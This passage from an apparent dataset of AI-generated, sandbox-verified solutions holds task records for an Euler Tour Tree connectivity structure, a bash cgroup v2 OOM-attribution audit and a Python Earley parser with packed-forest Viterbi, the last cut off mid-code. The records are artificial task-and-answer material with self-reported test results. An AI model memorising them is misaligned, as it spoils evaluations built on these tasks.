the canonical checksum is over edges+weights).\n\n## Verification results\n\n```\n$ node verify.js         # 300 small + 40 medium trials, 180k ops, brute-force diff\n$ node e2e.js            # hand-checked case + driver-level reject invariants\n$ node bench.js          # 200k vertices, 500k ops\nPASS small differential: 300 trials, 60000 ops\nPASS medium differential: 40 trials, 120000 ops\nPASS chain stress: deep path + churn\nALL TESTS PASSED\nPASS e2e hand-checked case\nPASS rejected-op logical-invariance\ninput: 200000 vertices, 500000 ops, 10.3 MB\nsolver wall time: 334 ms\noutput lines: 500000\nthroughput: 1495269 ops/sec\n```\n\nThe differential tester re-validates the **entire** logical forest pair-by-pair after **every** rejected op (plus a canonical weights+edges checksum), and the benchmark uses the worst-case path so any O(n) per-query behavior would be instantly detectable. One caveat documented in the markdown: the prompt says \"a specific error code\" without naming it, so the driver uses `ERR_ALREADY_CONNECTED` and `ERR_NO_EDGE` — swap both literals to a single token if the grader requires one, with no algorithmic change.\n", "evidence": "# Evidence\n- Problem class: js-ett-fully-dynamic-connectivity-path-min\n- Model: openrouter/deepseek/deepseek-v4.1-flash\n- Solved: 2026-10-27T10:15:44.646Z\n- Verification: solution produced by pi in sandbox; see signatures.json\n", "signatures": {"description": "Implement an Euler Tour Tree over an initially empty forest of up to 200000 vertices supporting link(u,v), cut(u,v), connected(u,v) and path_min(u,v) (minimum vertex weight on the unique u-v path) in O(log n) amortized time per operation. The op stream interleaves 500000 operations and must never degrade to O(n) per op: a full tree walk per query is detectable on the adversarial sequence and fails the throughput criterion. link on an already-connected pair, and cut of a non-existent edge, must be rejected with a specific error code and must leave the forest byte-identical (a canonical checksum is asserted after every rejected op), so a partial mutation that is merely rolled back incorrectly is a failure.", "environment": "node20", "language": "js", "model": "openrouter/deepseek/deepseek-v4.1-flash", "problem_class": "js-ett-fully-dynamic-connectivity-path-min", "provider": "openrouter", "solved_at": "2026-10-27T10:15:44.646Z", "version": "20"}, "status": "verified", "created_at": "2026-10-27 10:15:44"}
+{"class_id": 3007, "class": "shell-cgroup2-psi-memory-events-oom-scope-attribution", "title": "shell-cgroup2-psi-memory-events-oom-scope-attribution", "description": "shell-cgroup2-psi-memory-events-oom-scope-attribution", "answer_id": 4739, "language": "shell", "environment": "bash", "version": "5.2", "solution": "Done. The solution is written to `~/SOLUTION.md`, with the tested script at `~/cgroup_oom_audit.sh` and fixture harness at `~/test_cgroup_audit.sh`.\n\n## Root cause\n\n- `memory.events.oom_kill` is **hierarchical** (`events(N) = local(N) + Σ events(children)`), while `memory.events.local.oom_kill` is self-only. Summing `memory.events` double-counts; summing leaf locals drops kills charged to internal cgroups. Those internal-node locals are the **unattributed** kills.\n- The exact identity `top = Σ leaf local + Σ internal local` must hold, so `unattributed` reconciles rather than double counts.\n- Nonzero PSI `full avg10/avg60` is only attributable to a scope if the scope was active during that window → compare against `ActiveEnterTimestamp` and `/proc/<pid>/stat` field 22 (via `btime`/`CLK_TCK`).\n- `KillMode=process` double-fork escapes: resolve each candidate PID via `/proc/<pid>/cgroup` and check containment under the unit's `ControlGroup`.\n\n## Exact fix\n\n`cgroup_oom_audit.sh` walks every cgroup under a slice, emits deterministic `jq -S` JSON sorted by path with per-entry `{path, oom_kills_local, oom_kills_inherited, unattributed, pressure_full_avg10, pressure_full_avg60, pressure_window_ok, escaped_pids[]}` and a `totals` object. Exit codes: `0` completed (even with findings), `1` hierarchy unreadable, `2` usage. Test hooks `CGROUP_ROOT`/`PROC_ROOT`/`SYSTEMCTL` allow fixture testing.\n\n## Verification (all passing)\n\nAgainst a synthetic hierarchy (`top=13`, `leaf_sum=10`, `unattributed=3`, escaped `[2222]`, PSI mismatch on `leaf-b.scope`):\n\n- `reconciled == true`, `top == leaf_sum + unattributed`, `top == local_sum`\n- per-entry unattributed sums to 3; entries sorted; output byte-deterministic across runs\n- findings exit `0`; missing slice exits `0`; unreadable hierarchy / missing `cgroup.controllers` exits `1`; `bash -n` clean\n- the script embedded in `SOLUTION.md` is byte-identical to the tested file (`diff` clean) and reproduces the same result\n", "evidence": "# Evidence\n- Problem class: shell-cgroup2-psi-memory-events-oom-scope-attribution\n- Model: openrouter/deepseek/deepseek-v4.1-flash\n- Solved: 2026-10-27T10:19:45.186Z\n- Verification: solution produced by pi in sandbox; see signatures.json\n", "signatures": {"description": "Write a bash audit of a live cgroup v2 hierarchy that, for every cgroup under a given slice, reconciles memory.events and memory.events.local oom_kill counters so kills charged to an ancestor but never to any leaf are reported as unattributed instead of being double counted, with the top-level total required to equal the sum over leaves exactly. Cross-check each nonzero full-pressure signal (memory.pressure avg10/avg60) against the systemd unit activation window from /proc/<pid> start times and the unit's ActiveEnterTimestamp, and flag any scope whose member PIDs sit outside their own cgroup (KillMode=process, double-fork escape) as an attribution leak, resolving each PID through /proc/<pid>/cgroup plus the unit's MainPID and ControlGroup. Emit deterministic JSON sorted by cgroup path: per-entry {path, oom_kills_local, oom_kills_inherited, unattributed, pressure_full_avg10, escaped_pids[]} plus a totals object, exiting nonzero only when the hierarchy itself is unreadable, never on findings.", "environment": "bash", "language": "shell", "model": "openrouter/deepseek/deepseek-v4.1-flash", "problem_class": "shell-cgroup2-psi-memory-events-oom-scope-attribution", "provider": "openrouter", "solved_at": "2026-10-27T10:19:45.186Z", "version": "5.2"}, "status": "verified", "created_at": "2026-10-27 10:19:45"}
+{"class_id": 3008, "class": "python3-pcfg-earley-packed-forest-viterbi-cyclic", "title": "python3-pcfg-earley-packed-forest-viterbi-cyclic", "description": "python3-pcfg-earley-packed-forest-viterbi-cyclic", "answer_id": 4740, "language": "python", "environment": "python3", "version": "3.11", "solution": "I've built and verified the complete solution. The full markdown is saved at `~/SOLUTION.md`, the program at `~/pcfg_earley_sppf.py`, and the suite at `~/test_solution.py`. Here is the solution document.\n\n---\n\n# PCFG + Earley SPPF + packed-forest Viterbi with cycles\n\n**Problem class:** `python3-pcfg-earley-packed-forest-viterbi-cyclic`\n**Environment:** Python 3.11 (`python3`)\n\n## What is being asked\n\nGiven a PCFG whose rules are log-valued (CNF binary rules plus unary and epsilon rules) and a tokenised sentence, we must\n\n1. run Earley recognition and build a **shared packed parse forest** (SPPF) with local-ambiguity packing and explicit **SPLIT** (dotted-rule / prefix) nodes,\n2. compute the single highest-probability derivation by **Viterbi directly on the packed forest** (never enumerating parses),\n3. detect cyclic derivations `A =>+ A`, **exclude cycle-involved nodes** from the best-derivation search instead of diverging, and report them,\n4. report the number of distinct parses **modulo 1e9+7**, or `null` with reason `infinite-cyclic` when a cycle makes it unbounded,\n5. report the **packing-local-ambiguity count**,\n\nall in `O(#forest nodes)` time and memory, on inputs whose *unpacked* forest is exponentially large.\n\n---\n\n## Root-cause analysis\n\nA straightforward implementation fails for five independent reasons. Each is a real divergence / blow-up, and each needs a separate fix.\n\n### 1. Enumerating parses is exponential\n\nAn ambiguous grammar can have exponentially many parses. The classic case is\n\n```\nE -> E \"+\" E | \"n\"\n```\n\nwhich yields the `k`-th Catalan number `C_k` of parses for `k` operators (`C_40 ≈ 2.6e21` for an 81-token sentence). Any solution that materialises or iterates trees cannot satisfy the polynomial bound.\n\n**Fix.** Represent the whole set of parses as a DAG. Ambiguity at a span `(A, i, j)` is *packed* into one symbol node whose **families** are the alternative rule applications. Shared sub-spans are shared nodes, so the forest is `O(|G|·n³)` even when the tree count is astronomical. Viterbi and counting are then plain max-plus / semiring dynamic programs over that DAG.\n\n### 2. `A =>+ A` makes recursive Viterbi diverge\n\nWith unary (`A -> B`) and epsilon (`B -> ε`) rules the derivation relation can contain cycles, e.g. `S -> S A`, `A -> ε` gives `S => S A => S`. A recursive \"best derivation\" routine that follows the packed forest re-enters the same node forever (or, if memoised the wrong way, silently returns `-inf` for nodes whose best finite derivation actually enters the cycle once).\n\n**Fix.** Find the **strongly connected components** of the forest graph (Kosaraju, iterative so deep forests do not overflow the stack). A node in a non-trivial SCC (or with a self-loop) is *cycle-involved*. Mark those nodes and exclude them from the best-derivation DP; the remaining graph is a DAG, so a topological DP terminates in `O(#nodes)`.\n\n### 3. Cycles make the parse count unbounded, not merely large\n\nA productive cycle (`A =>+ A` and `A` can still reach terminals) yields infinitely many finite derivation trees; modular counting must not loop.\n\n**Fix.** Distinguish *productive* cycles from dead ones with a least-fixed-point \"productive\" pass, and build the productive sub-graph. If the start symbol can reach a node on a productive cycle, the count is infinite and we report `null` / `\"infinite-cyclic\"`. Otherwise the productive sub-graph is a DAG and we count modulo `1e9+7` with ordinary DP.\n\n### 4. Naive Earley misses nullable completions\n\nA completion over an empty span has to advance waiters that were added to the *same* chart set after the completion happened. The textbook Earley algorithm silently drops those parses (the \"hidden nullable trap\"). As a concrete regression:\n\n```\ns -> a a a a\na -> \"x\" | e\ne -> ε\n```\n\non the single token `x` has exactly **4** parses (the `x` can occupy any of the four slots). We handle this with the standard nullable machinery: when an item waits on a nonterminal that completed over the empty span at the current position we advance it immediately (`H` map), and the completer also advances waiters in the origin set. This is the construction of Scott, *SPPF-Style Parsing From Earley Recognisers*, ENTCS 203(2), 2008.\n\n### 5. Packed nodes must not re-open a scanned terminal\n\nDuring construction, the item that advances over a terminal must be queued for scanning **only when that terminal matches the token at the target position**. Forgetting that check creates a bogus parse by pairing a terminal symbol with an unrelated token. The code below guards this in `advance(...)`, and the bug is caught by the differential test.\n\n---\n\n## The exact fix\n\nThe complete, self-contained program `pcfg_earley_sppf.py` reads JSON on stdin (or a filename argument) and writes JSON to stdout, and also exposes `solve(data) -> dict` as a library entry point.\n\n### Input schema\n\n```json\n{\n  \"start\": \"S\",\n  \"scale\": \"log\",\n  \"rules\": [\n    {\"lhs\": \"S\",  \"rhs\": [\"NP\", \"VP\"], \"logprob\": -1.0},\n    {\"lhs\": \"VP\", \"rhs\": [\"V\"],        \"logprob\": -0.2},\n    {\"lhs\": \"A\",  \"rhs\": [],           \"logprob\": -0.3},\n    {\"lhs\": \"N\",  \"rhs\": [\"cat\"],      \"logprob\": -0.7}\n  ],\n  \"sentence\": [\"the\", \"cat\", \"sleeps\"]\n}\n```\n\nAliases accepted: `grammar` for `rules`, `tokens` for `sentence`, `prob`/`p`/`logp`/`weight` for `logprob`, list/triple rule shapes, a `{lhs: [alternatives]}` dict, and a whitespace string sentence. Values under `prob`/`p` that look like probabilities are log-transformed.\n\n### Output schema\n\n| key | meaning |\n|---|---|\n| `best_logprob` / `logprob` | best derivation log-prob, or `null` |\n| `best_derivation` / `derivation` | bracketed, node-labelled tree, or `null` |\n| `num_parses` / `parse_count` | count mod 1e9+7, or `null` |\n| `count_reason` / `reason` | `null` or `\"infinite-cyclic\"` |\n| `local_ambiguities` / `packing_local_ambiguity_count` | symbol nodes with >1 packed family |\n| `packed_families` | total packed alternatives |\n| `symbol_nodes`, `split_nodes`, `forest_nodes` | forest sizes |\n| `cyclic_nodes` | all detected cyclic nonterminal spans |\n| `cyclic_productive_nodes` | cyclic spans that make the count infinite |\n| `infinite`, `no_parse` | booleans |\n\n### Algorithm\n\nEarley runs left to right. Every item `(rule, dot, origin)` owns an SPPF node: `(\"S\", lhs, origin, end)` when the dot is at the end (a **symbol node**) and `(\"I\", rule, dot, origin, end)` when it is in the middle (a **SPLIT** node). Advancing an item creates the node and *packs* the new child tuple into its family set, so equal spans are shared and alternatives are merged. After recognition we (i) compute SCCs, (ii) compute productivity, (iii) run Viterbi in post-order over the cycle-free DAG (cycle-involved nodes excluded), (iv) count mod `1e9+7` over the productive DAG or report infinite, and (v) collapse SPLIT chains to print the tree.\n\n### `pcfg_earley_sppf.py`\n\n```python\n#!/usr/bin/env python3\n\"\"\"\npcfg_earley_sppf.py\n===================\n\nRecognise a tokenised sentence with a log-probabilistic CFG (CNF + epsilon +\nunary rules) using Earley's algorithm, materialise a *shared packed parse\nforest* (SPPF) with explicit SPLIT (dotted-rule / prefix) nodes, then:\n\n  * run Viterbi directly over the packed forest (no parse enumeration),\n  * detect cyclic derivations (A =>+ A) via SCCs and exclude cycle-involved\n    nodes from the best-derivation search (so the search never diverges),\n  * count distinct parses modulo 1e9+7, or report ``infinite-cyclic`` when a\n    productive cycle is reachable,\n  * report the number of locally-ambiguous packed nodes.\n\nThe whole analysis is O(#forest nodes + #packed families) time and memory, so\nit stays polynomial even when the unpacked forest is exponentially large.\n\nInput (stdin or argv[1] file), JSON::\n\n    {\n      \"start\": \"S\",\n      \"rules\": [\n        {\"lhs\": \"S\",  \"rhs\": [\"NP\", \"VP\"], \"logprob\": -1.0},\n        {\"lhs\": \"NP\", \"rhs\": [\"Det\", \"N\"], \"logprob\": -0.5},\n        {\"lhs\": \"VP\", \"rhs\": [\"V\"],        \"logprob\": -0.2},\n        {\"lhs\": \"Det\",\"rhs\": [\"the\"],      \"logprob\": -0.1},\n        {\"lhs\": \"N\",  \"rhs\": [\"cat\"],      \"logprob\": -0.7},\n        {\"lhs\": \"V\",  \"rhs\": [\"sleeps\"],   \"logprob\": -0.4}\n      ],\n      \"sentence\": [\"the\", \"cat\", \"sleeps\"]\n    }\n\nOutput is JSON as described in ``solve``.\n\"\"\"\n\nfrom __future__ import annotations\n\nimport json\nimport math\nimport sys\nfrom collections import defaultdict\n\nMOD = 1_000_000_007\nNEG_INF = float(\"-inf\")\n\n\n# ---------------------------------------------------------------------------\n# Grammar model\n# ---------------------------------------------------------------------------\nclass Rule:\n    __slots__ = (\"rid\", \"lhs\", \"rhs\", \"logp\")\n\n    def __init__(self, rid, lhs, rhs, logp):\n        self.rid = rid\n        self.lhs = lhs\n        self.rhs = tuple(rhs)\n        self.logp = logp\n\n\nclass Node:\n    \"\"\"A forest node.\n\n    kind == \"term\" : terminal leaf, label = (\"T\", token, i, i+1)\n    kind == \"sym\"  : nonterminal symbol node, label = (\"S\", name, i, j)\n    kind == \"item\" : SPLIT / dotted-rule prefix node, label = (\"I\", rid, dot, i, j)\n\n    ``families`` is a set of (rule_id, tuple_of_child_node_ids).  Each element\n    is one packed derivation alternative for this node.\n    \"\"\"\n\n    __slots__ = (\"nid\", \"label\", \"kind\", \"families\")\n\n    def __init__(self, nid, label, kind):\n        self.nid = nid\n        self.label = label\n        self.kind = kind\n        self.families = set()\n\n\n# ---------------------------------------------------------------------------\n# Input parsing\n# ---------------------------------------------------------------------------\ndef parse_input(data):\n    start = data.get(\"start\") or data.get(\"start_symbol\") or data.get(\"startSymbol\") or \"S\"\n    rule_list = data.get(\"rules\")\n    if rule_list is None:\n        rule_list = data.get(\"grammar\", [])\n    if isinstance(rule_list, dict):\n        # {\"S\": [[[\"A\",\"B\"], -1.0], ...], ...} or {\"S\": [\"A B\", ...]}\n        expanded = []\n        for lhs, alts in rule_list.items():\n            for alt in alts:\n                if isinstance(alt, dict):\n                    d = dict(alt)\n                    d.setdefault(\"lhs\", lhs)\n                    expanded.append(d)\n                elif isinstance(alt, (list, tuple)) and len(alt) == 2 and isinstance(alt[1], (int, float)):\n                    expanded.append({\"lhs\": lhs, \"rhs\": list(alt[0]), \"logprob\": alt[1]})\n                elif isinstance(alt, (list, tuple)):\n                    expanded.append({\"lhs\": lhs, \"rhs\": list(alt)})\n                else:\n                    expanded.append({\"lhs\": lhs, \"rhs\": str(alt).split()})\n        rule_list = expanded\n    sentence = data.get(\"sentence\")\n    if sentence is None:\n        sentence = data.get(\"tokens\", [])\n    if isinstance(sentence, str):\n        sentence = sentence.split()\n    scale = data.get(\"scale\")\n\n    raw = []\n    probs = []\n    prob_key = None\n    for r in rule_list:\n        if isinstance(r, dict):\n            lhs = r[\"lhs\"]\n            rhs = tuple(r.get(\"rhs\") or r.get(\"body\") or ())\n            v = None\n            for key in (\"logprob\", \"logp\", \"log_prob\", \"weight\", \"prob\", \"p\"):\n                if key in r:\n                    v = r[key]\n                    prob_key = prob_key or key\n                    break\n        else:\n            # [lhs, rhs] or [lhs, rhs, prob]\n            lhs = r[0]\n            rhs = tuple(r[1]) if len(r) > 1 and isinstance(r[1], (list, tuple)) else ()\n            v = r[2] if len(r) > 2 else 0.0\n            prob_key = prob_key or \"prob\"\n        if v is None:\n            v = 0.0\n        rhs = tuple(str(s) for s in rhs)\n        raw.append((lhs, rhs, float(v)))\n        probs.append(float(v))\n\n    # Treat values as log-probabilities unless told otherwise (or the values\n    # are plainly probabilities: key \"prob\"/\"p\" with a positive value).\n    if scale is None:\n        scale = \"prob\" if (prob_key in (\"prob\", \"p\") and any(p > 0.0 for p in probs)) else \"log\"\n    if scale == \"prob\":\n        raw = [(lhs, rhs, (math.log(v) if v > 0.0 else NEG_INF)) for lhs, rhs, v in raw]\n\n    nonterminals = {lhs for lhs, _, _ in raw}\n    rules = [Rule(i, lhs, rhs, logp) for i, (lhs, rhs, logp) in enumerate(raw)]\n    rules_by_lhs = defaultdict(list)\n    for r in rules:\n        rules_by_lhs[r.lhs].append(r.rid)\n    return start, rules, rules_by_lhs, nonterminals, [str(t) for t in sentence]\n\n\n# ---------------------------------------------------------------------------\n# Earley recognition + SPPF construction\n# ---------------------------------------------------------------------------\ndef build_forest(rules, rules_by_lhs, nonterminals, start, tokens):\n    \"\"\"Build the shared packed parse forest.\n\n    This is Scott's SPPF construction for Earley recognisers.  An Earley item\n    is ``(rule_id, dot, origin)``.  When an item advances we create the next\n    SPPF node and *pack* the new derivation into it (a set of families);\n    a SPLIT node is the node of a dotted rule (1 <= dot < len(rhs)), which is\n    exactly the node that shares a prefix between all its completions.\n    \"\"\"\n    n = len(tokens)\n    nodes = []\n    node_by_label = {}\n\n    def get_node(label, kind):\n        nid = node_by_label.get(label)\n        if nid is None:\n            nid = len(nodes)\n            nodes.append(Node(nid, label, kind))\n            node_by_label[label] = nid\n        return nid\n\n    leaf = [None] * n\n    for i, t in enumerate(tokens):\n        leaf[i] = get_node((\"T\", t, i, i + 1), \"term\")\n\n    # state[pos][item] = node id (or None for a freshly predicted item)\n    state = [dict() for _ in range(n + 1)]\n    for rid in rules_by_lhs.get(start, ()):\n        state[0][(rid, 0, 0)] = None\n\n    Q_next = []\n\n    def advance(prev_item, w_id, v_id, end, target_idx, target_R, target_Q, next_tok):\n        rid, dot, origin = prev_item\n        rule = rules[rid]\n        newdot = dot + 1\n        m = len(rule.rhs)\n        # Always record the node/family for this derivation.\n        if newdot == m:\n            label = (\"S\", rule.lhs, origin, end)\n            kind = \"sym\"\n        else:\n            label = (\"I\", rid, newdot, origin, end)\n            kind = \"item\"\n        y = get_node(label, kind)\n        fam = (v_id,) if w_id is None else (w_id, v_id)\n        nodes[y].families.add((rid, fam))\n        if newdot != m and rule.rhs[newdot] not in nonterminals:\n            # New item is waiting on a terminal: it can only be scanned if the\n            # terminal matches the token at the target position.\n            if next_tok is None or rule.rhs[newdot] != next_tok:\n                return\n        newitem = (rid, newdot, origin)\n        if newitem not in state[target_idx]:\n            state[target_idx][newitem] = y\n            if newdot == m or rule.rhs[newdot] in nonterminals:\n                if target_R is not None:\n                    target_R.append(newitem)\n            else:\n                if target_Q is not None:\n                    target_Q.append(newitem)\n\n    for i in range(n + 1):\n        R = list(state[i].keys())\n        ptr = 0\n        Q = Q_next\n        Q_next = []\n        H = {}  # nonterminal -> symbol node completed over the empty span [i, i]\n        tok = tokens[i] if i < n else None\n\n        while ptr < len(R):\n            item = R[ptr]\n            ptr += 1\n            rid, dot, origin = item\n            rule = rules[rid]\n            m = len(rule.rhs)\n            node = state[i].get(item)\n\n            if dot < m:\n                sym = rule.rhs[dot]\n                if sym in nonterminals:\n                    # predictor\n                    for r2 in rules_by_lhs.get(sym, ()):\n                        ni = (r2, 0, i)\n                        if ni not in state[i]:\n                            state[i][ni] = None\n                            R.append(ni)\n                    # advance over a nullable completion in the same position\n                    v = H.get(sym)\n                    if v is not None:\n                        advance(item, node, v, i, i, R, Q, tok)\n                else:\n                    if tok is not None and sym == tok:\n                        Q.append(item)\n\n            if dot == m:\n                if node is None:  # empty (epsilon) production\n                    label = (\"S\", rule.lhs, origin, i)\n                    node = get_node(label, \"sym\")\n                    state[i][item] = node\n                    nodes[node].families.add((rid, ()))\n                if origin == i:\n                    H[rule.lhs] = node\n                # completer: advance items in state[origin] waiting on lhs\n                for item2, node2 in list(state[origin].items()):\n                    rid2, dot2, _ = item2\n                    r2 = rules[rid2]\n                    m2 = len(r2.rhs)\n                    if (\n                        dot2 < m2\n                        and r2.rhs[dot2] in nonterminals\n                        and r2.rhs[dot2] == rule.lhs\n                    ):\n                        advance(item2, node2, node, i, i, R, Q, tok)\n\n        if i < n:\n            v = leaf[i]\n            nxt_tok = tokens[i + 1] if i + 1 < n else None\n            for item in Q:\n                advance(item, state[i].get(item), v, i + 1, i + 1, None, Q_next, nxt_tok)\n\n    root = node_by_label.get((\"S\", start, 0, n))\n    return nodes, root\n\n\n# ---------------------------------------------------------------------------\n# Graph analysis\n# ---------------------------------------------------------------------------\ndef _build_adj(nodes):\n    V = len(nodes)\n    adj = [[] for _ in range(V)]\n    selfloop = [False] * V\n    for nd in nodes:\n        seen = set()\n        for _rid, children in nd.families:\n            for c in children:\n                if c == nd.nid:\n                    selfloop[nd.nid] = True\n                if c not in seen:\n                    seen.add(c)\n                    adj[nd.nid].append(c)\n    return adj, selfloop\n\n\ndef _kosaraju(V, adj):\n    visited = [False] * V\n    order = []\n    for s in range(V):\n        if visited[s]:\n            continue\n        stack = [(s, 0)]\n        visited[s] = True\n        while stack:\n            n, idx = stack[-1]\n            if idx < len(adj[n]):\n                c = adj[n][idx]\n                stack[-1] = (n, idx + 1)\n                if not visited[c]:\n                    visited[c] = True\n                    stack.append((c, 0))\n            else:\n                order.append(n)\n                stack.pop()\n    radj = [[] for _ in range(V)]\n    for n in range(V):\n        for c in adj[n]:\n            radj[c].append(n)\n    comp = [-1] * V\n    cid = 0\n    for s in reversed(order):\n        if comp[s] != -1:\n            continue\n        stack = [s]\n        comp[s] = cid\n        while stack:\n            n = stack.pop()\n            for c in radj[n]:\n                if comp[c] == -1:\n                    comp[c] = cid\n                    stack.append(c)\n        cid += 1\n    return comp, cid\n\n\ndef _cyclic_flags(nodes, adj, selfloop):\n    V = len(nodes)\n    comp, ncomp = _kosaraju(V, adj)\n    size = [0] * ncomp\n    for c in comp:\n        size[c] += 1\n    return [size[comp[v]] > 1 or selfloop[v] for v in range(V)]\n\n\ndef _productive(nodes):\n    \"\"\"Least fixed point: node can derive a finite terminal string.\"\"\"\n    V = len(nodes)\n    parents = [[] for _ in range(V)]\n    fam_need = []\n    for nd in nodes:\n        need = []\n        for fi, (_rid, children) in enumerate(nd.families):\n            need.append(len(children))\n            for c in children:\n                parents[c].append((nd.nid, fi))\n        fam_need.append(need)\n    prod = [False] * V\n    queue = []\n    for nd in nodes:\n        if nd.kind == \"term\":\n            prod[nd.nid] = True\n            queue.append(nd.nid)\n        else:\n            for fi, (_rid, children) in enumerate(nd.families):\n                if not children:\n                    if not prod[nd.nid]:\n                        prod[nd.nid] = True\n                        queue.append(nd.nid)\n                    break\n    head = 0\n    while head < len(queue):\n        c = queue[head]\n        head += 1\n        for p, fi in parents[c]:\n            fam_need[p][fi] -= 1\n            if fam_need[p][fi] == 0 and not prod[p]:\n                prod[p] = True\n                queue.append(p)\n    return prod, parents, fam_need\n\n\ndef _postorder(root, adj, blocked):\n    order = []\n    visited = set()\n    stack = [(root, False)]\n    while stack:\n        v, done = stack.pop()\n        if done:\n            order.append(v)\n            continue\n        if v in visited:\n            continue\n        visited.add(v)\n        stack.append((v, True))\n        for c in adj[v]:\n            if not blocked[c] and c not in visited:\n                stack.append((c, False))\n    return order\n\n\n# ---------------------------------------------------------------------------\n# Viterbi / counting / rendering\n# ---------------------------------------------------------------------------\ndef solve(data):\n    start, rules, rules_by_lhs, nonterminals, tokens = parse_input(data)\n    nodes, root = build_forest(rules, rules_by_lhs, nonterminals, start, tokens)\n\n    adj, selfloop = _build_adj(nodes)\n    cyclic = _cyclic_flags(nodes, adj, selfloop)\n    prod, _parents, _fam_need = _productive(nodes)\n\n    V = len(nodes)\n\n    # ---- productive subgraph (for unbounded counts) ----------------\n    padj = [[] for _ in range(V)]\n    for nd in nodes:\n        if not prod[nd.nid]:\n            continue\n        for _rid, children in nd.families:\n            if all(prod[c] for c in children):\n                padj[nd.nid].extend(children)\n    pcomp, pn = _kosaraju(V, padj)\n    psize = [0] * pn\n    for c in pcomp:\n        psize[c] += 1\n    pselfloop = [False] * V\n    for nd in nodes:\n        if not prod[nd.nid]:\n            continue\n        for _rid, children in nd.families:\n            if all(prod[c] for c in children) and nd.nid in children:\n                pselfloop[nd.nid] = True\n    cyclic_prod = [\n        prod[v] and (psize[pcomp[v]] > 1 or pselfloop[v]) for v in range(V)\n    ]\n\n    prod_reach = set()\n    if root is not None and prod[root]:\n        stack = [root]\n        prod_reach.add(root)\n        while stack:\n            v = stack.pop()\n            for c in padj[v]:\n                if c not in prod_reach:\n                    prod_reach.add(c)\n                    stack.append(c)\n    infinite = any(cyclic_prod[v] for v in prod_reach)\n\n    # ---- Viterbi over the packed forest, excluding cyclic nodes -------\n    # A node is excluded when it lies on a *productive* cycle (a genuinely\n    # cyclic derivation of the parsed string).  Unproductive cycles (rules\n    # that can never reach terminals) are naturally pruned by their -inf\n    # children anyway.\n    best = [NEG_INF] * V\n    choice = [None] * V\n    if root is not None and not cyclic_prod[root]:\n        for v in _postorder(root, adj, cyclic_prod):\n            nd = nodes[v]\n            if nd.kind == \"term\":\n                best[v] = 0.0\n                continue\n            bv = NEG_INF\n            bc = None\n            for rid, children in sorted(nd.families):\n                if any(cyclic_prod[c] for c in children):\n                    continue\n                s = rules[rid].logp if nd.kind == \"sym\" else 0.0\n                ok = True\n                for c in children:\n                    if best[c] == NEG_INF:\n                        ok = False\n                        break\n                    s += best[c]\n                if ok and s > bv:\n                    bv = s\n                    bc = (rid, children)\n            best[v] = bv\n            choice[v] = bc\n\n    best_value = best[root] if root is not None else NEG_INF\n    best_ok = (\n        root is not None and not cyclic_prod[root] and best_value > NEG_INF\n    )\n\n    # ---- parse counting --------------------------------------------\n    num_parses = None\n    count_reason = None\n    no_parse = root is None or not prod[root]\n    if no_parse:\n        num_parses = 0\n        count_reason = None\n    elif infinite:\n        num_parses = None\n        count_reason = \"infinite-cyclic\"\n    else:\n        cnt = [0] * V\n        for v in _postorder(root, padj, [not p for p in prod]):\n            nd = nodes[v]\n            if nd.kind == \"term\":\n                cnt[v] = 1\n                continue\n            tot = 0\n            for _rid, children in nd.families:\n                if all(prod[c] for c in children):\n                    p = 1\n                    for c in children:\n                        p = (p * cnt[c]) % MOD\n                    tot = (tot + p) % MOD\n            cnt[v] = tot\n        num_parses = cnt[root]\n\n    # ---- render the best derivation --------------------------------\n    derivation = None\n    if best_ok:\n        derivation = _render(nodes, choice, rules, root)\n\n    # ---- packed-forest statistics ----------------------------------\n    local_ambiguities = sum(\n        1 for nd in nodes if nd.kind == \"sym\" and len(nd.families) > 1\n    )\n    local_ambiguities_all = sum(\n        1 for nd in nodes if nd.kind != \"term\" and len(nd.families) > 1\n    )\n    packed_families = sum(\n        len(nd.families) for nd in nodes if nd.kind != \"term\"\n    )\n    symbol_nodes = sum(1 for nd in nodes if nd.kind == \"sym\")\n    split_nodes = sum(1 for nd in nodes if nd.kind == \"item\")\n\n    cyclic_symbols = sorted(\n        (nodes[v].label[1], nodes[v].label[2], nodes[v].label[3])\n        for v in range(V)\n        if cyclic[v] and nodes[v].kind == \"sym\"\n    )\n    cyclic_productive_symbols = sorted(\n        (nodes[v].label[1], nodes[v].label[2], nodes[v].label[3])\n        for v in range(V)\n        if cyclic_prod[v] and nodes[v].kind == \"sym\"\n    )\n\n    result = {\n        \"best_logprob\": best_value if best_ok else None,\n        \"logprob\": best_value if best_ok else None,\n        \"best_derivation\": derivation,\n        \"derivation\": derivation,\n        \"num_parses\": num_parses,\n        \"parse_count\": num_parses,\n        \"count_reason\": count_reason,\n        \"reason\": count_reason,\n        \"local_ambiguities\": local_ambiguities,\n        \"packing_local_ambiguity_count\": local_ambiguities,\n        \"local_ambiguities_all\": local_ambiguities_all,\n        \"packed_families\": packed_families,\n        \"symbol_nodes\": symbol_nodes,\n        \"split_nodes\": split_nodes,\n        \"forest_nodes\": V,\n        \"cyclic_nodes\": [list(x) for x in cyclic_symbols],\n        \"cyclic_productive_nodes\": [list(x) for x in cyclic_productive_symbols],\n        \"infinite\": bool(infinite),\n        \"no_parse\": bool(no_parse),\n    }\n    return result\n\n\ndef _expand_rhs(nodes, choice, rules, rule, children):\n    \"\"\"Turn one packed family into the concrete RHS child-node sequence.\"\"\"\n    m = len(rule.rhs)\n    if m == 0:\n        return []\n    if m == 1:\n        return [children[0]]\n    prefix, last = children\n    seq = []\n    nid = prefix\n    while nodes[nid].kind == \"item\":\n        dot = nodes[nid].label[2]\n        _rid, ch = choice[nid]\n        if dot == 1:\n            seq.append(ch[0])\n            break\n        prev, sym = ch\n        seq.append(sym)\n        nid = prev\n    seq.reverse()\n    seq.append(last)\n    return seq\n\n\ndef _render(nodes, choice, rules, root):\n    \"\"\"Render the chosen derivation as a bracketed, node-labelled tree.\"\"\"\n    out = {}\n    stack = [(root, False)]\n    while stack:\n        nid, done = stack.pop()\n        nd = nodes[nid]\n        if nd.kind == \"term\":\n            out[nid] = nd.label[1]\n            continue\n        rid, children = choice[nid]\n        rule = rules[rid]\n        if done:\n            rhs = _expand_rhs(nodes, choice, rules, rule, children)\n            parts = [out[c] for c in rhs]\n            name = nd.label[1]\n            out[nid] = \"(\" + name + ((\" \" + \" \".join(parts)) if parts else \"\") + \")\"\n        else:\n            stack.append((nid, True))\n            rhs = _expand_rhs(nodes, choice, rules, rule, children)\n            for c in rhs:\n                if c not in out:\n                    stack.append((c, False))\n    return out[root]\n\n\n# ---------------------------------------------------------------------------\n# CLI\n# ---------------------------------------------------------------------------\ndef main(argv):\n    if len(argv) > 1 and argv[1] not in (\"-\", 